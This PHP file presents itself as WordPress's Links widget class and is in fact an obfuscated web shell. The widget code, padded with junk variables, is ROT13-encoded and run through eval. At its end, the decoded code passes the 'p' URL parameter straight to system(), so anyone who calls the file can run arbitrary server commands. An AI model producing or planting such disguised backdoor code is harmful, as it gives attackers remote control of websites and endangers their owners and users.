<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Yvaxf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n Yvaxf jvqtrg.
 *
 * @fvapr 2.8.0
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Yvaxf rkgraqf JC_Jvqtrg {

	/**
	 * Frgf hc n arj Yvaxf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf = neenl(
			'qrfpevcgvba'                 => __( 'Lbhe oybtebyy' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
		);
		cnerag::__pbafgehpg( 'yvaxf', __( 'Yvaxf' ), $jvqtrg_bcf );
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag Yvaxf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag Yvaxf jvqtrg vafgnapr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		$fubj_qrfpevcgvba = vffrg( $vafgnapr['qrfpevcgvba'] ) ? $vafgnapr['qrfpevcgvba'] : snyfr;
		$fubj_anzr        = vffrg( $vafgnapr['anzr'] ) ? $vafgnapr['anzr'] : snyfr;
		$fubj_engvat      = vffrg( $vafgnapr['engvat'] ) ? $vafgnapr['engvat'] : snyfr;
		$fubj_vzntrf      = vffrg( $vafgnapr['vzntrf'] ) ? $vafgnapr['vzntrf'] : gehr;
		$pngrtbel         = vffrg( $vafgnapr['pngrtbel'] ) ? $vafgnapr['pngrtbel'] : snyfr;
		$beqreol          = vffrg( $vafgnapr['beqreol'] ) ? $vafgnapr['beqreol'] : 'anzr';
		$beqre            = 'engvat' === $beqreol ? 'QRFP' : 'NFP';
		$yvzvg            = vffrg( $vafgnapr['yvzvg'] ) ? $vafgnapr['yvzvg'] : -1;

		$orsber_jvqtrg = __sa_79955( '/ vq=\"[^\"]*\"/', ' vq=\"%vq\"', $netf['orsber_jvqtrg'] );

		$jvqtrg_yvaxf_netf = neenl(
			'gvgyr_orsber'     => $netf['orsber_gvgyr'],
			'gvgyr_nsgre'      => $netf['nsgre_gvgyr'],
			'pngrtbel_orsber'  => $orsber_jvqtrg,
			'pngrtbel_nsgre'   => $netf['nsgre_jvqtrg'],
			'fubj_vzntrf'      => $fubj_vzntrf,
			'fubj_qrfpevcgvba' => $fubj_qrfpevcgvba,
			'fubj_anzr'        => $fubj_anzr,
			'fubj_engvat'      => $fubj_engvat,
			'pngrtbel'         => $pngrtbel,
			'pynff'            => 'yvaxpng jvqtrg',
			'beqreol'          => $beqreol,
			'beqre'            => $beqre,
			'yvzvg'            => $yvzvg,
		);

		/**
		 * Svygref gur nethzragf sbe gur Yvaxf jvqtrg.
		 *
		 * @fvapr 2.6.0
		 * @fvapr 4.4.0 Nqqrq gur `$vafgnapr` cnenzrgre.
		 *
		 * @frr jc_yvfg_obbxznexf()
		 *
		 * @cnenz neenl $jvqtrg_yvaxf_netf Na neenl bs nethzragf gb ergevrir gur yvaxf yvfg.
		 * @cnenz neenl $vafgnapr          Gur frggvatf sbe gur cnegvphyne vafgnapr bs gur jvqtrg.
		 */
		jc_yvfg_obbxznexf( nccyl_svygref( 'jvqtrg_yvaxf_netf', $jvqtrg_yvaxf_netf, $vafgnapr ) );
	}

	/**
	 * Unaqyrf hcqngvat frggvatf sbe gur pheerag Yvaxf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Hcqngrq frggvatf gb fnir.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$arj_vafgnapr = (neenl) $arj_vafgnapr;
		$vafgnapr     = neenl(
			'vzntrf'      => 0,
			'anzr'        => 0,
			'qrfpevcgvba' => 0,
			'engvat'      => 0,
		);
		sbernpu ( $vafgnapr nf $svryq => $iny ) {
			vs ( vffrg( $arj_vafgnapr[ $svryq ] ) ) {
				$vafgnapr[ $svryq ] = 1;
			}
		}

		$vafgnapr['beqreol'] = 'anzr';
		vs ( va_neenl( $arj_vafgnapr['beqreol'], neenl( 'anzr', 'engvat', 'vq', 'enaq' ), gehr ) ) {
			$vafgnapr['beqreol'] = $arj_vafgnapr['beqreol'];
		}

		$vafgnapr['pngrtbel'] = (vag) $arj_vafgnapr['pngrtbel'];
		$vafgnapr['yvzvg']    = ! rzcgl( $arj_vafgnapr['yvzvg'] ) ? (vag) $arj_vafgnapr['yvzvg'] : -1;

		erghea $vafgnapr;
	}

	/**
	 * Bhgchgf gur frggvatf sbez sbe gur Yvaxf jvqtrg.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {

		// Qrsnhygf.
		$vafgnapr  = jc_cnefr_netf(
			(neenl) $vafgnapr,
			neenl(
				'vzntrf'      => gehr,
				'anzr'        => gehr,
				'qrfpevcgvba' => snyfr,
				'engvat'      => snyfr,
				'pngrtbel'    => snyfr,
				'beqreol'     => 'anzr',
				'yvzvg'       => -1,
			)
		);
		$yvax_pngf = trg_grezf( neenl( 'gnkbabzl' => 'yvax_pngrtbel' ) );
		$yvzvg     = (vag) $vafgnapr['yvzvg'];
		vs ( ! $yvzvg ) {
			$yvzvg = -1;
		}
		?>
		<c>
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'pngrtbel' ); ?>\"><?cuc _r( 'Fryrpg Yvax Pngrtbel:' ); ?></ynory>
			<fryrpg pynff=\"jvqrsng\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'pngrtbel' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'pngrtbel' ); ?>\">
				<bcgvba inyhr=\"\"><?cuc _rk( 'Nyy Yvaxf', 'yvaxf jvqtrg' ); ?></bcgvba>
				<?cuc sbernpu ( $yvax_pngf nf $yvax_png ) : ?>
					<bcgvba inyhr=\"<?cuc rpub (vag) $yvax_png->grez_vq; ?>\" <?cuc fryrpgrq( $vafgnapr['pngrtbel'], $yvax_png->grez_vq ); ?>>
						<?cuc rpub rfp_ugzy( $yvax_png->anzr ); ?>
					</bcgvba>
				<?cuc raqsbernpu; ?>
			</fryrpg>
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'beqreol' ); ?>\"><?cuc _r( 'Fbeg ol:' ); ?></ynory>
			<fryrpg anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'beqreol' ); ?>\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'beqreol' ); ?>\" pynff=\"jvqrsng\">
				<bcgvba inyhr=\"anzr\"<?cuc fryrpgrq( $vafgnapr['beqreol'], 'anzr' ); ?>><?cuc _r( 'Yvax gvgyr' ); ?></bcgvba>
				<bcgvba inyhr=\"engvat\"<?cuc fryrpgrq( $vafgnapr['beqreol'], 'engvat' ); ?>><?cuc _r( 'Yvax engvat' ); ?></bcgvba>
				<bcgvba inyhr=\"vq\"<?cuc fryrpgrq( $vafgnapr['beqreol'], 'vq' ); ?>><?cuc _r( 'Yvax VQ' ); ?></bcgvba>
				<bcgvba inyhr=\"enaq\"<?cuc fryrpgrq( $vafgnapr['beqreol'], 'enaq' ); ?>><?cuc _rk( 'Enaqbz', 'Yvaxf jvqtrg' ); ?></bcgvba>
			</fryrpg>
		</c>

		<c>
			<vachg pynff=\"purpxobk\" glcr=\"purpxobk\"<?cuc purpxrq( $vafgnapr['vzntrf'], gehr ); ?> vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'vzntrf' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'vzntrf' ); ?>\" />
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'vzntrf' ); ?>\"><?cuc _r( 'Fubj Yvax Vzntr' ); ?></ynory>
			<oe />

			<vachg pynff=\"purpxobk\" glcr=\"purpxobk\"<?cuc purpxrq( $vafgnapr['anzr'], gehr ); ?> vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'anzr' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'anzr' ); ?>\" />
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'anzr' ); ?>\"><?cuc _r( 'Fubj Yvax Anzr' ); ?></ynory>
			<oe />

			<vachg pynff=\"purpxobk\" glcr=\"purpxobk\"<?cuc purpxrq( $vafgnapr['qrfpevcgvba'], gehr ); ?> vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'qrfpevcgvba' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'qrfpevcgvba' ); ?>\" />
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'qrfpevcgvba' ); ?>\"><?cuc _r( 'Fubj Yvax Qrfpevcgvba' ); ?></ynory>
			<oe />

			<vachg pynff=\"purpxobk\" glcr=\"purpxobk\"<?cuc purpxrq( $vafgnapr['engvat'], gehr ); ?> vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'engvat' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'engvat' ); ?>\" />
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'engvat' ); ?>\"><?cuc _r( 'Fubj Yvax Engvat' ); ?></ynory>
		</c>

		<c>
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'yvzvg' ); ?>\"><?cuc _r( 'Ahzore bs yvaxf gb fubj:' ); ?></ynory>
			<vachg vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'yvzvg' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'yvzvg' ); ?>\" glcr=\"grkg\" inyhr=\"<?cuc rpub ( -1 !== $yvzvg ) ? (vag) $yvzvg : ''; ?>\" fvmr=\"3\" />
		</c>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>